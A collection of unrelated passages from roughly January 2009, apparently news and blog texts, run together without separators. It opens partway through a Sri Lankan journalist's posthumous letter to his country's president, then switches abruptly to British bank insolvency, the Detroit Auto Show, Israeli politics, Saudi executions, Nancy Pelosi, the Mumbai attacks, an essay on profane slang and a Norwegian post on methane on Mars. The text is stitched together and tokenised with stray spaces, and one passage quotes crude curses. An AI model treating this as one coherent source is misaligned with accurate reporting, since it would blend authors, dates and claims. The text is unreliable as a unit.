It was after a lot of soul - searching that we broke the story , at the same time urging you to return the money .
By the time you did so several weeks later , a great blow had been struck to your reputation .
It is one you are still trying to live down .
You have told me yourself that you were not greedy for the presidency .
You did not have to hanker after it : it fell into your lap .
You have told me that your sons are your greatest joy , and that you love spending time with them , leaving your brothers to operate the machinery of state .
Now , it is clear to all who will see that that machinery has operated so well that my sons and daughter do not themselves have a father .
In the wake of my death I know you will make all the usual sanctimonious noises and call upon the police to hold a swift and thorough inquiry .
But like all the inquiries you have ordered in the past , nothing will come of this one , too .
For truth be told , we both know who will be behind my death , but dare not call his name .
Not just my life , but yours too , depends on it .
Sadly , for all the dreams you had for our country in your younger days , in just three years you have reduced it to rubble .
In the name of patriotism you have trampled on human rights , nurtured unbridled corruption and squandered public money like no other President before you .
Indeed , your conduct has been like a small child suddenly let loose in a toyshop .
That analogy is perhaps inapt because no child could have caused so much blood to be spilled on this land as you have , or trampled on the rights of its citizens as you do .
Although you are now so drunk with power that you cannot see it , you will come to regret your sons having so rich an inheritance of blood .
It can only bring tragedy .
As for me , it is with a clear conscience that I go to meet my Maker .
I wish , when your time finally comes , you could do the same .
I wish .
As for me , I have the satisfaction of knowing that I walked tall and bowed to no man .
And I have not travelled this journey alone .
Fellow journalists in other branches of the media walked with me : most of them are now dead , imprisoned without trial or exiled in far - off lands .
Others walk in the shadow of death that your Presidency has cast on the freedoms for which you once fought so hard .
You will never be allowed to forget that my death took place under your watch .
As anguished as I know you will be , I also know that you will have no choice but to protect my killers : you will see to it that the guilty one is never convicted .
You have no choice .
I feel sorry for you , and Shiranthi will have a long time to spend on her knees when next she goes for Confession for it is not just her owns sins which she must confess , but those of her extended family that keeps you in office .
As for the readers of The Sunday Leader , what can I say but Thank You for supporting our mission .
We have espoused unpopular causes , stood up for those too feeble to stand up for themselves , locked horns with the high and mighty so swollen with power that they have forgotten their roots , exposed corruption and the waste of your hard - earned tax rupees , and made sure that whatever the propaganda of the day , you were allowed to hear a contrary view .
For this I - and my family - have now paid the price that I have long known I will one day have to pay .
I am - and have always been - ready for that .
I have done nothing to prevent this outcome : no security , no precautions .
I want my murderer to know that I am not a coward like he is , hiding behind human shields while condemning thousands of innocents to death .
What am I among so many ?
It has long been written that my life would be taken , and by whom .
All that remains to be written is when .
That The Sunday Leader will continue fighting the good fight , too , is written .
For I did not fight this fight alone .
Many more of us have to be - and will be - killed before The Leader is laid to rest .
I hope my assassination will be seen not as a defeat of freedom but an inspiration for those who survive to step up their efforts .
Indeed , I hope that it will help galvanise forces that will usher in a new era of human liberty in our beloved motherland .
I also hope it will open the eyes of your President to the fact that however many are slaughtered in the name of patriotism , the human spirit will endure and flourish .
Not all the Rajapakses combined can kill that .
People often ask me why I take such risks and tell me it is a matter of time before I am bumped off .
Of course I know that : it is inevitable .
But if we do not speak out now , there will be no one left to speak for those who cannot , whether they be ethnic minorities , the disadvantaged or the persecuted .
An example that has inspired me throughout my career in journalism has been that of the German theologian , Martin Niem ” ller .
In his youth he was an anti-Semite and an admirer of Hitler .
As Nazism took hold in Germany , however , he saw Nazism for what it was : it was not just the Jews Hitler sought to extirpate , it was just about anyone with an alternate point of view .
Niem ” ller spoke out , and for his trouble was incarcerated in the Sachsenhausen and Dachau concentration camps from 1937 to 1945 , and very nearly executed .
While incarcerated , Niem ” ller wrote a poem that , from the first time I read it in my teenage years , stuck hauntingly in my mind :
First they came for the Jews and I did not speak out because I was not a Jew .
Then they came for the Communists and I did not speak out because I was not a Communist .
Then they came for the trade unionists and I did not speak out because I was not a trade unionist .
Then they came for me and there was no one left to speak out for me .
If you remember nothing else , remember this :
The Leader is there for you , be you Sinhalese , Tamil , Muslim , low - caste , homosexual , dissident or disabled .
Its staff will fight on , unbowed and unafraid , with the courage to which you have become accustomed .
Do not take that commitment for granted .
Let there be no doubt that whatever sacrifices we journalists make , they are not made for our own glory or enrichment : they are made for you .
Whether you deserve their sacrifice is another matter .
As for me , God knows I tried .
The Independent is reporting ( was reporting but the post has been yanked ) British banks are ' technically insolvent ' .
The link above as well as what follows is from Google cache .
Not sure how long that cache will stay but here is the article that someone , for some reason , wanted to suppress .
By Ben Russell and David Prosser
Saturday , 17 January 2009
Britains biggest banks are " technically insolvent " , Royal Bank of Scotland said yesterday , as the global banking industry was rocked by another day of turmoil , including the announcement of $ 23 bn ( £ 16bn ) of new losses from Merrill Lynch and Citigroup , the giant US institutions .
Analysts working for RBS , one of several British banks to have received emergency funding from the UK Government last year , told the City that " the domestic UK banks are technically insolvent on a fully marked - to - market basis " .
The warning does not mean British banks are about to go bust , because the assessment is purely theoretical , and RBS said the position was " not unusual at this stage in the economic cycle " .
However , it will add to pressure on the Government to provide more support for the country 's banks .
Treasury officials are now set to spend this weekend in talks about a fresh round of measures , which could be unveiled as early as next week , to free up lending to households and major corporations hit by the credit crunch .
The value of Barclays fell by a quarter in stock market trading yesterday , amid a series of wild rumours about its finances , although the bank said it saw no need to comment on the drop .
Its board said in a statement last night that it knew " no justification for the fall " .
The statement said next month the bank expected to report that profits before tax for 2008 were " well ahead " of the £ 5.3 billion forecast by analysts .
City analysts said the bank had been targeted by traders after regulators lifted a ban yesterday on the short selling of financial stocks .
Barclays ' share price , along with the value of other British banks , was also hit by dismal news from the international markets , including the announcement on Thursday night that the Irish government was nationalising Allied Irish Banks .
In the US , Bank of America announced yesterday that it was taking a $ 20bn injection of emergency funding from the US government , subsequently revealing that Merrill Lynch , the investment bank it rescued last year , had lost more than £ 15bn in the final three months of last year .
Citigroup , once the world 's largest bank , announced more than $ 8bn of losses for the final quarter of last year , and revealed plans to split itself in two .
Treasury officials were still discussing plans to help British banks last night but the proposals are likely to include up to £ 100bn of new guarantees for the wholesale markets that underpin mortgage and other loans .
Other possible measures being considered include state support to help Britain 's largest companies raise their own funds .
Another option is to launch a " bad bank " to remove tainted assets from the banks ' balance sheets , though while this policy is under consideration , it is thought to remain some way off .
Other proposals include ring - fencing the toxic assets within bank balance sheets .
Lord Mandelson , the Business Secretary , has also talked of easing the terms of the Government 's £ 37bn bank bailout in order to kickstart lending .
Downing Street made it clear yesterday that the Government remained committed to doing " whatever is necessary to help British businesses and families get through this global financial recession " .
Reform plan raises fears of Bank secrecy
The Bank of England will be able to print extra money without having legally to declare it under new plans which will heighten fears that the Government will secretly pump extra cash into the economy .
The Government is set to throw out the 165 - year old law that obliges the Bank to publish a weekly account of its balance sheet – a move that will allow it theoretically to embark covertly on so - called quantitative easing .
The Banking Bill , which is currently passing through Parliament , abolishes a key section of the law laid down by Robert Peel 's Government in 1844 which originally granted the Bank the sole right to print UK money .
The ostensible reason for the reform , which means the Bank will not have to print details of its own accounts and the amount of notes and coins flowing through the UK economy , is to allow the Bank more power to overhaul troubled financial institutions in the future , under its Special Resolution Authority .
However , some have warned that it means : " there is nothing to stop an unreported and unmonitored flooding of the money market by the undisciplined use of the printing presses . "
It comes after the Bank 's Monetary Policy Committee cut interest rates by half a percentage point , leaving them at the lowest level since the bank 's foundation in 1694 .
Debating the issue in the House of Lords recently , Lord James of Blackheath , a Conservative peer , said : " Remove [ this ] control and there is nothing to stop an unreported and unmonitored flooding of the money market by the undisciplined use of the printing presses .
" Quite why the Bank has to keep its operations so shrouded in secrecy is a mystery to me , " said Simon Ward , economist at New Star .
" This [ reform ] will make it much more difficult to track what the Bank is doing . "
Just because we had fun at the Detroit Auto Show does n't mean there were n't somber moments .
In fact , most moments were .
Here are the 11 most depressing moments from the 2009 Detroit Auto Show .

11 . ) Reporters Asking Us For Jobs
Advertisement
While working at Jalopnik may seem like a dream job , we 're sometimes treated as a curiosity by print journalists who do n't understand how the web works .
Not this year .
The sheer number of people asking , and the flood of resumes into Wert 's inbox sort of harshed our buzz .
10 . ) The Lack Of A Firehouse
G/O Media may get a commission LG 75 - Inch 8K TV Buy for $ 2150 from BuyDig Use the promo code ASL250
If you want to understand the sheer impact the Carpocalypse has had on the world , consider the fact the Firehouse bar is no more .
For those unaware , the " Firehouse " was a real firehouse converted by Chrysler each year into a bar where they 'd pay for free drinks and food for journalists .
It was a fun afterparty .
The kind of place you can have Dr. Z pour you a beer or Motor Trend Editor - in - Chief Angus McKenzie lecture you on the new media landscape for an hour .
The Post 's " Hacks n' Flacks " BYOB ( Buy Your Own Beer ) after - party , while fun , just was n't quite the same .

9. ) Swag And Press Releases
Advertisement
Any journalist worth his or her salt could walk out of an auto show with three or four - hundred USB flash drives and lots of toys .
Back in the good ol ' days of , you know , last year , automakers would pass out unnecessarily ornate press packs filled with USB drives on keychains and leather - bound press releases .
This year they were back to pieces of paper and discs .
The nicest USB drive we received was from BYD , which promptly corrupted the files we loaded on it ( no joke ) .
8. ) Cheap Floor Space
Advertisement
The lack of certain automakers meant companies like Revenge were no longer relegated to Michigan Hall in Cobo 's basement .
The reason this is so sad is it makes it seem like DUB cars are on the same level as the new offerings from Chrysler .
Well ... come to think of it .

7. ) Chrysler

Chrysler President Jim
Press used part of his press conference to explain why Chrysler would resurrect itself and how great a job the company has done in firing people .
Seriously , they laid off like thousands of people .
That makes them awesome how ?
But that 's just Jim , the rest of the company was even worse .
Like Cubs fans convinced this will be their year , Chrysler 's need to convince everyone they have a future with cars like the 200C EV Concept is just depressing .
This is especially true when you consider they did n't have the requisite cash to mount their logo without almost killing someone .

6. ) GM's Fake Rally

GM built a fake card - carrying rally with employees around their reveal on Sunday morning of the Detroit Auto Show .
You know it 's bad when you look around and realize they could n't even get enough employees together to make the rally look impressive .
5. ) The Plight Of Male Booth Professionals
Advertisement
Since they had nothing to reveal , Lamborghini merely trotted out their typical team of hot booth professionals to pose in front of their cars .
They held a press conference to do this and we , like others , took lots of photos .
We felt awful for the male model as the sound of shutters clicking drastically declined when he walked on the platform .
Sorry , guy who looks vaguely like a taller Mark Rufallo .

4. ) Alcohol Consumption - to - New Product Ratio
Advertisement
There were a number of reveals this year , but not of new product .
Most were concept cars of the pie - in - the - sky variety .
The absence of new product on the show floor was made up for by automaker booze .
Normally , we expect that type of thing in the after - hours , but this year that was cut back in favor of allowing cheaper offerings on the show floor in even greater quantities .

3. ) Michigan Hall Basement Smell
Advertisement
Though it gave us a chance to drive the Ford Escape Plug - In Hybrid , the electric test track in the basement smelled awful .
Was it the cars ?
No . Was it the Wayne State Formula SAE team ?
No .
Actually , it was the mulch .
The smell was so intolerable indoors , the VW booth above was forced to run their air conditioning to blow the smell out .
That caused the air conditioning units to drip water into the basement , onto the track where it ran off into the mulch — thus causing the smell to become worse .
By the end of the press preview , the Volkswagen booth was smelling like the inside of an abandoned Westfalia camper .
Advertisement
2. ) Tuesday
Advertisement
Tuesday is usually a down day for the show , reserved for non-product press conferences and demonstrations .
This year there was so little to report on we ended up in a two - way battle with dozens of auto reporters to get to the Tesla press conference and then again to get to Senator Bob Corker .
Seriously , ou'd have thought Elon Musk and Corker were both Bono .
Neither needs the added ego boost .
Senator Corker Comes To Detroit , Cavorts With Ze Germans Senator Corker , Republican of Tennessee , is not exactly popular around the Michigan area for saying Read more

1. ) Dead People
On the first night of the show we went out to a restaurant near Cobo to grab some food and do some work .
We wandered out around 11 pm and noticed flashing police lights .
We have to thank the jerk who said " Do n't mind him , he 's dead " and made us turn to see the lifeless body lying in the cold Detroit street because we'd have otherwise not noticed .
We told the interns he was " sleeping " just to make sure they did n't go home with nightmares .
Instead , we did .

With the latest poll from Israel ’s Channel 2 showing a 12 seat gap between the Likud and Kadima Parties , the perception is that Netanyahu ’s pro-war rhetoric and the taint of Foreign Minister Tzipi Livni ’s perceived involvement in the peace process with the Palestinian Authority are the deciding factor in next month ’s elections .
Both sides made similar comments today : one trying to shore up his image as a hawk and the other trying to shed her image as a slightly less hawkish hawk .
In a speech at Tel Aviv - Jaffa College , Livni condemned reports of concessions she and Olmert allegedly jointly made during the peace process .
“ The headline does not represent me or what I am advancing , ” Livni insisted , saying that her agenda was to maximize the number of Jewish residents in the West Bank and “ not allowing the return of a single refugee . ”
Livni has also reportedly accused Prime Minister Olmert of deliberately undermining her campaign by trying to link her to the peace process .
Not to be outdone , frontrunner Benjamin Netanyahu declared Olmert ’s understandings with the Palestinians “ invadlid and unimportant ” and promised not to keep Olmert ’s commitments to evacuate settlements .
Netanyahu has accused Livni of attempting to give up Jerusalem , and said that on the contrary his party will never agree to a return to the 1967 borders or allowing any division of Jerusalem .

The report , Affront To Justice : Death Penalty in Saudi Arabia , describes how foreign nationals are at a severe disadvantage in Saudi courts .
Foreign nationals are often not represented by lawyers .
Confessions are often obtained under duress , torture or deception .
Trials are carried out in secret and are conducted with no translation from Arabic .
Furthermore , foreign nationals , the majority of them from Asia and Africa , lack the financial means or the social contacts to arrange pardons via ‘ diya ’ or ‘ blood money ’ arrangements .
Saudi Arabia has no official records of its use of capital punishment , but Amnesty has recorded 1,695 cases since 1985 of which 830 were made against foreign nationals .
Saudi Arabia executes with beheadings and ranks third in the world in its use of the death penalty behind China and Iran .
Recently there has been an extension in the use of the practice with executions for non-violent crimes .
Do n’t Panic profiles foreign nationals who have been sentenced to death in Saudi Arabia :
1. A 39 - year - old Indian woman ( whose name has not been given ) is currently under sentence of death by stoning for alleged adultery , apparently following a process during which she had no legal representation .
2. Rizana Nafeek is a young Sri Lankan woman who moved to Saudi Arabia to work as a maid .
Rizana , who was 17 when she started work in Saudi Arabia , was convicted of killing a four - month - old baby boy in her care just two weeks into her job .
Ritzana is believed to have confessed to police but she has since retracted her confession saying that the baby died choking on milk .

Following the execution , the Saudi Press Agency stated that Ibrahim had been accused by another foreign resident of practicing magic in order to separate him from his wife .
Evidence was alleged to have been found in his home , including books on black magic , a candle with an incantation " to summon devils " and " foul - smelling herbs " .
6. Six Somalis were publicly beheaded on 4 April 2005 .
The six had been arrested in 1999 , convicted for robberies and sentenced to five years ' imprisonment and flogging .

The young men were denied legal representation .
Neither they nor their relatives had been aware that they would receive a death sentences until the morning of their execution .
Barack Obama being elected America ’s first African - American President was n’t the only first this year , as Silveron , Oregon has now entered the record books as the first place in America to ever elect a transgender mayor .
Stu Rasmussen was elected mayor of Silverton , Oregon by a handsome margin of 13 % .
Rasmussen had previously had 2 terms as mayor in the 1990 ’s , but as a man , before he had breast implants and wore high heels .
“ I indentify mostly as a heterosexual male , ” Rasmussen said .
“ But I just like to look like a female . ”
He attributes his victory to his knowledge of the issues .
“ The first 30 seconds they think , am I in freak show ?
Is there a camera behind me ?
What ’s going on here ? ” said Rasmussen .
“ And then we get down to discussing whatever the issue is — city business or whatever — and they figure out this guy ’s different , but he knows what he ’s talking about . ”

Nancy Pelosi is living the paradox of a politician whose dreams are about to come true .
With 111th , the age of Pelosi dawns
Nancy Pelosi , whose steel - and - satin political style was shaped by a childhood in the Democratic clubhouses of Baltimore and the chardonnay fundraising circuit in 1980s San Francisco , is living the paradox of a politician whose dreams are about to come true .
The first female speaker of the House is at the apex of her power , with a newly expanded 257 - 178 Democratic majority , a seemingly firm grip on her caucus and a broad national consensus for bold — even unprecedented — congressional action .
Advertisement
But a perch on the mountaintop often comes with altitude sickness .
Among Pelosi ’s new headaches : coordinating the biggest domestic spending spree in history with an untested new president , keeping newly elected Democrats in conservative districts from being labeled liberal tax - and - spenders for their “ yes ” votes — and accomplishing all this without her top leg - breaker and backslapper , Rahm Emanuel , the new White House chief of staff .
“ She ’s been working her entire career to be at this point — a speaker with a big enough majority that she can actually do something , ” said Pelosi biographer Mark Sandalow , who tracked the California Democrat ’s career for two decades as a columnist for the San Francisco Chronicle .
“ Even though she agrees with Obama on almost everything , it ’s going to be interesting to see if the Age of Pelosi collides with the Age of Obama , ” he added .
In mid-December , Pelosi and several of her top lieutenants sat down with President - elect Barack Obama ’s legislative affairs chief , Phil Schiliro , to choreograph the complex first movements of the Pelosi - Obama legislative pas de deux .
The mood was relaxed and friendly , but the speaker made it quite clear that she thought the Obama camp was sending mixed signals on how it planned to push the long - delayed extension of State Children ’s Health Insurance Program .
“ She said everybody — everybody — needs to be on the same page , that we ca n’t afford to have our signals crossed , ” said a person familiar with the meeting who spoke on condition of anonymity .
“ She wants to make sure the administration speaks with one voice .
...
We need to score a series of quick victories out of the box . ”
The fate of the country — not to mention the shiny larger Democratic majorities in both houses — rides on the success of the Pelosi - Obama partnership , according to Maryland Rep.
Chris Van Hollen , whom Pelosi recently cajoled into serving a second term at the helm of the Democratic Congressional Campaign Committee .
“ Our political fortunes are tied to Barack Obama’s .
It ’s impossible to overstate that , ” Van Hollen said .
“ The 2010 midterm [ elections ] will show us not only how Congress did but how successful the administration was , ” he added .
“ In every respect , it will be a midterm report card not only on the Congress but on the White House , too . ”
Another Pelosi insider put it more bluntly : Obama and Pelosi “ have a joint vision of how the country should be governed — but that does n’t mean she plans to be pushed around . ”
Pelosi has spent much of the past decade consolidating her power and imposing uncharacteristic order and discipline ( including the forced substitutions of “ we ” for “ I ” at news conferences ) on a Democratic Caucus long known for its feral , self - defeating unpredictability .
Elements of her management style are already legendary .
Pelosi seldom forgets a slight or a fight , as evidenced by a three - decade running battle with Rep. Steny H. Hoyer that culminated in a truce after Hoyer defeated Pelosi ally John P. Murtha to become Pelosi ’s majority leader .
Her decadelong , simmering feud with Michigan Rep. John Dingell ended more successfully for the speaker , when her pal , California Rep. Henry A. Waxman , unseated Dingell as chairman of the powerful Energy and Commerce Committee , which will help oversee the restructuring of Detroit ’s crippled auto industry .
And when Emanuel reportedly began nosing around in House leadership business after jumping on board with Obama , Pelosi politely but firmly reminded him that he was now a member of the executive branch .
But she would n’t have gotten where she is without a softer side and a self - deprecating sense of humor .
Those close to her know her charming alter ego — call her Nonna Nancy — a doting grandmother who takes genuine interest in members ’ personal lives , once surprising a longtime rival by showing up at his wife ’s funeral and walking a mile with him to the gravesite .
She has a habit of remembering the smallest kindnesses , rewarding friends with handwritten thank - you notes or chocolate cakes .
She has a playful side , even dragging Hoyer and Dingell onto the dance floor during a congressional retreat a few years back to defuse tension .
Still , every second of her reign — up until the moment Obama lays a hand on Abraham Lincoln ’s Bible — has been spent in opposition to a Republican president .
It ’s not yet clear how Pelosi ’s sweet - and - sour style will work in a Washington where Democrats actually rule .
“ The interesting thing about her , and it may be a saving grace , is that she does n’t have a huge ego , ” said Sandalow .
“ She cares about getting things done , not getting credit . ”
And getting things done in Pelosi ’s mind means the tightest possible coordination with Obama , aides and allies say , to push through most of the program before Republicans in the Senate have a chance to counterattack .
The strategy has obvious parallels to FDR ’s first 100 days — but it also hearkens back to the approach adopted by Bill Walsh , like Pelosi a San Francisco icon .
The late 49ers coach was famous for scripting his first 15 or 20 offensive plays of a game .
Pelosi plans to push through bills that already have broad support in her own caucus , starting with the extension of the children ’s health insurance program .
That will be followed by the behemoth : the massive $ 675 billion to $ 775 billion economic stimulus package .
From there , it ’s on to a re-examination of the bank bailouts and new funding bills for the wars in Iraq and Afghanistan , the scope of which will largely be determined by Obama ’s national security team .
The most controversial of Obama ’s big - ticket agenda items — health care reform and a clean energy bill — are n’t likely to be taken up until much later , leadership aides told Politico .
The House rules foster an illusion of autocracy , but its annals are littered with leonine speakers — Joe Cannon , John McCormack and Newt Gingrich , to name three — who failed to tend to their members ’ interests and paid with their jobs .
While Pelosi is committed to Obama ’s success , she has made it known to the president - elect ’s team that she needs to protect her members , particularly those in marginal districts who will be vulnerable in the 2010 midterm elections .
She also needs to keep an eye out for a revolt from the fiscally conservative Blue Dog Democrats , who will need assurance that she pays some attention to the principle of pay - as - you - go government in an age of trillion - dollar annual deficits .
“ Her principal challenge over the next two years will be from the pay - go members , who will want to know the serial number of every penny she spends , ” said Rep. Steve Israel ( D - N.Y . ) .
“ How she reconciles that conflict will be key . ”
That ’s why her team spent much of the holidays working on the creation of a high - profile oversight and accountability system for the stimulus plan .
The system would be modeled on the watchdog panel created to oversee the redevelopment of New Orleans following Hurricane Katrina .
Typically , those provisions would be folded into the stimulus bill , but Pelosi is now mulling a stand - alone accountability measure that would showcase Democrats ’ commitment to serious oversight — and assuage Blue Dogs appalled by the lack of meaningful oversight in the bank bailouts .

A Crockumentary is a piece of media that emulates a Documentary format , but is little more than veiled propaganda that is devoid of much truth or scientific legitimacy .
For example , Ben Stein 's movie Expelled is a classic Crockumentary .
It claims to be scientifically based , but in reality , the movie employs a plethora of logical fallacies to get across the notion that not believing in creation is tantamount to supporting genocide .
Crockumentaries are notorious for employing pseudo - science , suggesting that non-scientific theories or ideas are actually scientifically - founded ( i.e. astrology , paranormal claims , ghosts , spirits , UFOs , etc. ) and also perverting the concepts of new fields of science such as quantum physics , abiogenesis or astronomy .
In many cutting - edge fields of science there are a variety of open - ended ideas and theories .
Many crockumentary filmmakers suggest that the unknowns in new scientific theories can be filled with their hair - brained claims .
For example , The Secret suggests that certain notions of quantum mechanics can jibe with the film 's claim that one can create their own physical reality merely by the power of their mind .
In this case , the filmmakers interviewed respected scientists under false pretenses , then edited the interviews and interspersed their own non-scientific claims to make the film 's ideas appear to be supported by respected scientists .

Pakistan 's military on Sunday reportedly raided a militant camp in Kashmir suspected in connection with last month 's Mumbai terror attacks and seized a man identified by the sole surviving Mumbai attacker as the group 's mastermind .
The raid , if confirmed , would mark the first decisive action by Islamabad amid mounting pressure from the international community to bring to justice the group behind the deadly Mumbai rampage that killed at least 171 .
Pakistan 's attention to the Mumbai attacks also comes amid increasing militant attacks on Pakistan 's western border : today , for the second day in a row , Pakistani militants attacked supply lines near Peshawar .
The Guardian , citing an " official close to the extremist organization , " said in Sunday 's raid the alleged mastermind of the Mumbai attacks , Zaki-ur - Rehman Lakhvi , had been seized .
The official from Jamaat - ud - Dawa ( JuD ) , the charity and education arm of the terrorist group Lashkar - e - Taiba , told Reuters that Zaki-ur - Rehman Lakhvi was among four men taken into custody after a raid yesterday on a camp outside Muzaffarabad , the capital of Pakistani Kashmir .
Lakhvi , one of Lashkar 's operations chiefs , was named as a ringleader in the Mumbai plot by Ajmal Amir Kasab , the lone surviving gunmen captured after the attacks , according to Indian officials .
Reuters said Pakistani officials have not yet officially confirmed the raid .
The wire agency reported that Lakhvi and another ringleader gave orders by phone to the 10 gunmen who carried out the Mumbai attacks beginning Nov. 26 .
The agency noted that if the attack is confirmed , the next stage will likely be wrangling over how and where he is tried .
President Asif Ali Zardari has said that anyone arrested in Pakistan will be tried there , too .
The Pakistani military 's Inter - Services Intelligence ( ISI ) agency had ties in the past with Lashkar and other jihadi organizations fighting Indian rule in Kashmir , according to analysts , which could reduce the Pakistani authorities ' readiness to be transparent in its handling of the situation .
The Times ( of London ) reported that the raid occurred about three miles outside Muzaffarabad , the capital of Pakistan - controlled Kashmir .
The paper had the following details about Lakhvi :
Lakhvi , the alleged mastermind of the Mumbai attacks , was also a founder of LeT and has operated under several aliases as the group 's supreme operational commander .
US officials said that he had directed the group 's operations in Kashmir , Chechnya , Bosnia and Iraq .
Also known as Abdullah Azam , he comes from Okara district in Pakistan 's central province of Punjab , which is also where Ajmal Amir Kasab , the only militant captured in the Mumbai attacks , was born and raised .
Indian investigators say Kasab has identified Lakhvi as one of his LeT contacts and admitted to undergoing training at several militant camps in Pakistan , including one near Muzaffarabad .
Dawn , an English - language Pakistani newspaper , reported that similar raids were planned in Punjab , further south .
It ran more details on the raid in Kashmir from eyewitnesses .
Local residents , however , said they had seen army personnel taking control of the area along Shawai Nullah , some five kilometers northwest of Muzaffarabad , where the organization possesses a large plot of land on which several buildings had been built ....
" I saw an army helicopter hovering over the area and around 5 pm I heard two or three loud explosions , " a woman who lives in the area told Dawn on phone .
The Los Angeles Times said that because the three - day , major Muslim holiday Eid al - Adha , or the Feast of Sacrifice , began today , the Pakistani government may have wanted to take action before the holiday virtually shuts down the country .
The newspaper also struck a note of caution , saying that most of LeT 's training camps are actually thought to be on the other side of Pakistan , near its western border with Afghanistan .
It was unclear , though , whether Sunday 's reported raid was mainly a symbolic slap or meant to be a genuine blow to the group 's infrastructure .
Most of Lashkar - e - Taiba 's training centers are believed to be in Pakistan 's tribal areas along the Afghan border .
Meanwhile , The New York Times reported that US intelligence and counterterrorism officials say Pakistan 's spy agency had helped train and fund Lashkar - e - Taiba .
The report said US officials were now investigating those links and rethinking the threat from LeT .
American officials say there is no hard evidence to link the spy service , the Directorate for Inter - Services Intelligence , or ISI , to the Mumbai attacks .
But the ISI has shared intelligence with Lashkar and provided protection for it , the officials said , and investigators are focusing on one Lashkar leader they believe is a main liaison with the spy service and a mastermind of the attacks .
As a result of the assault on Mumbai , India 's financial hub , American counterterrorism and military officials say they are reassessing their view of Lashkar and believe it to be more capable and a greater threat than they had previously recognized .
In a commentary for Dawn , Ahmad Faruqui wrote that the Mumbai attackers may have hoped to derail the peace process between India and Pakistan over disputed Kashmir and strengthen extremists in both governments .
They wanted to send a clear and strong signal to the incoming Obama administration in Washington that Kashmir was a live issue that needed to be put on the front burner , ahead of Afghanistan and ahead of Iraq .
But yesterday , near Peshawar along Pakistan 's western border , militants attacked 160 trucks and Humvees heading to Afghanistan , The Christian Science Monitor reported .
Today , militants torched some 50 NATO vehicles in a terminal close to the city .
The attacks demonstrate a ramping - up of militants ' efforts on all fronts , The Monitor reports .
... As the world focuses on Pakistan 's eastern border with India , the militant threat along its western border is still spreading .
Sunday 's attack marks an intensification of a militant strategy : attacking US and NATO supply lines .
Some 70 percent of their equipment in Afghanistan comes through Pakistan .
At the same time , militants are pushing outward from tribal areas toward Peshawar in a " surge " of their own – trying to make headway before President - elect Obama takes office and sends more troops to Afghanistan .

Anyone with cable television or an Internet hookup knows all too well that this is the dawning of the age of the douchebag .
While the term for a feminine hygiene implement traces its history back to 1685 , its slang incarnation now proliferates on the airwaves and the Web .
Face it :
We 're surrounded by douchebags .
This comes as no surprise to the nation 's linguists .
They even have a term for this sort of thing : pejoration .
That 's when a neutral word takes on a negative meaning .
The Oxford English Dictionary traces this process back to 1967 , when " douchebag " was a popular epithet for " an unattractive coed " ; it has since morphed into " a general term of disparagement , esp. for an unattractive or boring person . "
James Matisoff , an emeritus professor in UC Berkeley 's linguistics department , concurs that douchebag 's pejoration has snowballed in recent years .
The culprits : Jon Stewart and his comedic brethren .
" On cable , you can use a word which has a perfectly innocent meaning — like ' balls ' or ' nuts , ' " he says .
" Jon Stewart can use it freely .
If he were to say ' fuck , ' ' shit , ' or ' cunt , ' that gets bleeped . "
( Incidentally , Stewart does , and they are . )
The words " douche " and " douchebag " seem to be mentioned daily on The Daily Show , whether it 's John Oliver reporting on George Washington ( " a quintessential American douche " ) , Jason Jones explaining how Mitt Romney was stumping for " the douchebag vote , " or Stewart himself awarding Robert Novak the Huge Douchebag award .
Yet among those who study profanity for a living , the douchebag is kid stuff .
Reinhold Aman of Cotati publishes Maledicta , " the international journal of verbal aggression . "
He rattles off a series of curses that knock the vinegar out of douchebag : " I shit in the beard of your father " ( Persia ) ; " Your mother 's milk is camel 's piss " ( the Arab world ) ; " Your parents have diseased genitals " ( Ghana ) ; and " I fuck the soul of your dead mother " ( Serbian Gypsies ) .
He hesitates before revealing the most vile , horrific curse he 's ever come across , a lament from Hungary 's peasantry : " Oh God , stop slapping me in the face with your cock all covered with shit from fucking Jesus . "
Aman pauses to let that one settle in .
" Douchebag is nothing !
It 's harmless , like an enema , you know ? "
Når det ringer etter 22.00 og før 07.00 neste dag her i heimen , har det ikke sjelden med å gjøre med massemedier som mener de har en interessant sak om verdensrommet .
Og i dette tilfellet har massemediene helt rett : bekreftelsen av en oppdagelse fra 2001 av metangass i atmosfæren på Mars er bemerkelsesverdig .
Vi snakker ikke om store mengder , rundt 45 deler per milliard i en atmosfære som i utgangspunktet er 100 ganger tynnere enn vår egen .
Utslippene på Mars er konsentrert i tre soner på den nordlige halvkulen
Men når det dreier seg om en gass som etter alle solemerker ikke skulle finnes på planeten , så får det astronomer verden over til å klø seg på sine akademiske kjaker og utstøte et kollektivt « hmm – interessant … »
Metan , med kjemisk betegnelse CH4 , brytes fort ned av den sterke ultrafiolette strålingen fra Sola ( Mars mangler et ozonlag ) , og derfor må gassen som er målt av teleskoper på bakken og av romsonden Mars Express stamme fra noe som er aktivt nå .
Det finnes to tenkelige kilder – geologisk aktivitet og biologi – og begge to er i strid med det bildet over førti års romforskning har skapt av planeten .
Helt siden Mariner 4 sendte tilbake de første bildene av en overflate som minnet mest om Månen , har inntrykket styrket seg av en iskald , livløs ørken der det ikke har skjedd stort på hundrevis av millioner av år .
Når og Spirit og Opportunity kjører rundt og tar bilder og prøver , er det spor etter tidligere aktivitet de leter etter .
Få forventer å finne tegn til at Mars er geologisk eller biologisk aktiv idag .
Skuffende Mariner 4 - bilde fra 1965
Erfaringen tilsier at vi bør vente med å la champagnekorkene sprette .
I 1976 trodde man en kort stund at Viking - landingsfartøyene hadde funnet tegn til liv i en prøve med sand , men kom snart til at det var en kjemisk reaksjon ( selv om enkelte forskere fremdeles insistererer på det motsatte ) .
I 1996 erklærte så NASA at man hadde funnet spor etter fossile mikroorganismer i meteoritten Allan Hills 84001 , som har fløyet hele veien fra Mars til Jorda for tusenvis av år siden .
President Clinton fikk æren av å presentere oppdagelsen , og mer enn antydet at vi her sto overfor noe som kunne forandre vårt syn på vår plass i universet ( man finner et klipp fra denne pressekonferansen i filmen Contact ) .
Men nok en gang ble vi skuffet .
Grundigere undersøkelser viste at de trådliknende strukturene enten var geologiske mikroformasjoner eller hadde dukket opp i meteoritten etter at den landet på Jorda .
« Bakterie » fra ALH84001
Men så har vi den delen som gir meg frysninger på ryggen : de nye rapportene fra Mars tyder på at metangassen har årstidsvariasjoner .
Utslippene toppet seg under sommerhalvåret på den nordlige halvkulen ( Mars har årstider , akkurat som Jorda ) .
Her jeg sitter med utsikt til en liten skog midt i Oslo , kan jeg ved selvsyn konstatere at biologisk aktivitet varierer sterkt med årstiden : gradestokken viser - 7 , og knapt noe rører seg der ute .
Dette kan også ses i Jordas atmosfære , der innholdet av CO2 forandres målbart med årstiden .
